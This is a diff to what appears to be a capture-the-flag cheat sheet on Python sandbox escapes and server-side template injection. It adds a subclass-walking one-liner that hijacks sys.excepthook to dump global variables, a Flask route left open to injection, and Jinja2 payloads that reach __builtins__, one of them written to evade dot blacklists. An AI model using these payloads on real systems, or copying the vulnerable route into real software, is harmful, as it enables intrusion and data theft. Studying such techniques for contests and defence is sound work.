@@ -27,7 +27,7 @@ Shell commands: `sh`, `python3`
 Helpful functions:
 - `os.system()`: probably the most well-known method     
 - `subprocess.call()`, `subprocess.run()`: allows you to spawn shells
-- `subprocess.Popen()`, `subprocess.check_output()`: runs commands and returns the output
+- `os.popen().read()`, `subprocess.Popen()`, `subprocess.check_output()`: runs commands and returns the output
 - `pty.spawn()`: lesser known but still helpful!
 
 Debug mode: `breakpoint()`, `__import__('sys').breakpointhook()`, `pdb.set_trace()`
@@ -69,6 +69,12 @@ Here, we access the `warnings` base class from the `catch_warnings` subclass, fr
 [c for c in ().__class__.__base__.__subclasses__() if "catch" in c.__name__][0]()._module.__builtins__["__import__"]
 ```
 
+We can even directly read variables by overwriting the `sys` module's exception handler to output all global variables.  
+
+```python
+(s:=[c for c in ().__class__.__base__.__subclasses__() if 'wrap_close' in c.__name__][0].__init__.__globals__['sys'], s.__setattr__('excepthook', lambda *a: s.stdout.write(a[2].tb_frame.f_globals.__str__())), a)
+```
+
 ### NO PARENTHESES??? 💔💔💔
 Probably the most troublesome to bypass...  
 Luckily, you can chain decorators to a dummy class to invoke functions without parentheses!
@@ -84,8 +90,6 @@ class C:
 Setting a `__builtins__` function to `None` completely removes the global reference to it (eg. `__builtins__.eval = None`)  
 
 Honestly nothing you can do about it brotato chip ✌🥀, just find another entry point.  
-
-### Reading variables
 
 ### More stuff
 Dynamically accessing attributes
@@ -103,6 +107,42 @@ Assigning variables
 
 ---
 ## SSTI
+
+In some Web challenges, you might see a vulnerability like this.  
+
+```python
+@app.route('/', methods=['GET', 'POST'])
+def index():
+    if request.method == "POST":
+        return render_template_string(f"Hello {request.form['name']}!")
+    else:
+        return '''
+            <form method="POST">
+                Name: <input type="text" name="name">
+                <input type="submit" value="Greet">
+            </form>
+        '''
+```
+
+The vulnerability lies in the way the webpage is rendered when the POST request is received. The `f-string` can be abused to retrieve `__builtins__` through Jinja2 introspection.  
+
+```
+{{ self.__init__.__globals__.__builtins__ }}
+```
+
+Jinja2 also has a special variable `request`, which refers to the current request being processed and can also be abused to access `__builtins__`
+
+```
+{{ request.application.__globals__.__builtins__ }}
+```
+
+An obfuscated way of achieving the above would be using Jinja2's `|` operator, which allows us to pipe the results of filters.  
+
+This is particularly useful if characters like `.` are blacklisted.  
+
+```python
+{{ self | attr('__init__') | attr('__globals__') | attr('__getitem__')('__builtins__') }}
+```
 
 ---
 ## Pickle
